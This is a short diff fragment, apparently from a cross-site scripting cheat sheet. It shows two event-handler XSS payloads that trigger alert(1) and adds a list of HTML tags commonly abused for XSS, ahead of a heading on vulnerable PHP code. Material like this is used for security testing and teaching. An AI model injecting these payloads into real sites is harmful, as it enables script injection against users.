@@ -76,7 +76,18 @@ HTML Payloads
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
 
+Common abused tags for XSS
 
+<script>
+<body>
+<img>
+<iframe>
+<input>
+<link>
+<table>
+<div>
+<object>
+<src>
 ```
 
 Unsecure PHP Vulnerable Code Example 1
